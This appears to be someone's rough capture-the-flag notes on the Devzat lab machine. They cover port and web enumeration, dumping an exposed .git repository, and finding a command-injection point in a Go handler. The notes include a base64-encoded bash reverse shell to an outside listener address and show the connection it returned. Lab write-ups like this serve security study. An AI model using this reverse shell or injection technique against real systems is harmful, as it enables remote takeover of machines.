Name: Devzat
IP: 10.10.11.118
OS: Linux

##**Enumeration::**##
nmap::
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: devzat - where the devs at
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data.
SF-Port8000-TCP:V=7.91%I=7%D=1/30%Time=61F72B44%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

dirb::
/assets, /images, /javascript, /server-status

http:
UN: patrick@devzat.htb
`ssh -l [username] devzat.htb -p 8000 `
+ w/ patrick:: Nickname reserved for local use, please choose a different one.
+ `id/ :: bad5f40e4a8de24f154becbbe6939ebaca4166aff3dd5b12e477a40a10193092`
+ id/ <user> Get a unique ID for a user (hashed IP)

nikto::
+ Server may leak inodes via ETags, header found with file /, inode: 197f, size: 5c570e80059d3, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3092: /LICENSE.txt: License file found may indicate something
  + Creative Commons Attribution 3.0 Unported

ffuf:: Nothing 
wfuzz::
`wfuzz -t 20 --hc 400,302 -H "HOST: FUZZ.devzat.htb" -w /opt/Seclist/Discovery/DNS/subdomains-top1million-110000.txt http://devzat.htb`::
+ http://pets.devzat.htb 
`wfuzz --sc 400,301 -w /opt/Seclist/Discovery/DNS/subdomains-top1million-110000.txt http://pets.devzat.htb/FUZZ`::
+ /css, /build, /.git see ![wfuzz_pets_](Screenshots/devzat_pets_fuzz.png)
  + [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/git)
    + view changes with git diff

##**git-dumper::**## see ![git-dumper](Screenshots/git-dumper.png)
`
mkdir -p /tmp/devzat && chmod 777 /tmp/devzat
./git_dumper.py http://pets.devzat.htb/.git /tmp/devzat/
`
 cat main.go::
cmd := exec.Command("sh", "-c", "characteristics/"+species)
    + revshell injection:
burpsuite:: http//pets.devzat.htb
+ nc shell doesnt work
`echo -n 'bash -i >& /dev/tcp/10.10.16.13/5555' |base64::YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMy81NTU1 ` 
+ burp request:: 
`broken shell:: TODO:: stablize` see ![broken_shell](Screenshots/devzat_base64_revshell.png)

TODO:
connect to [10.10.16.13] from (UNKNOWN) [10.10.11.118] 46228
bash: cannot set terminal process group (845): Inappropriate ioctl for device
bash: no job control in this shell



Font Awesome Free 5.9.0 by @fontawesome - https://fontawesome.com
html5up.net 

##**References::**##
[git-dumper](https://github.com/arthaud/git-dumper)

